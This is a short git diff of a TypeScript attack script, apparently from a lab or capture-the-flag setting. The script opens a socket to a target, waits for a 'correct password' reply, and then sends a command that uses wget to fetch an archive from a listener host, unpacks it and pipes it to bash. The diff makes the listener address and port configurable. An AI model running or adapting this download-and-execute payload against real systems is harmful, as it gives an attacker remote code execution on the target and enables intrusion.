@@ -1,6 +1,6 @@
 import * as net from 'net';
 
-const { RHOST = '127.0.0.1', RPORT = '9001' } = process.env;
+const { RHOST = '127.0.0.1', RPORT = '9001', LHOST = '10.13.1.79', LPORT = '1234' } = process.env;
 const TIMEOUT = 5000;
 
 const doProd = (): Promise<void> => {
@@ -28,7 +28,7 @@ const doProd = (): Promise<void> => {
 
         if (/correct password/i.test(data.toString())) {
           console.log('Password accepted.');
-          sock.write('wget -q -O- 10.13.1.79:1234/kk/kpz|tar -xvJO|bash\n', (err) => {
+          sock.write(`wget -q -O- ${LHOST}:${LPORT}/kk/kpz|tar -xvJO|bash\n`, (err) => {
             if (err) {
               console.error('Error writing to socket:', err);
               sock.destroy();
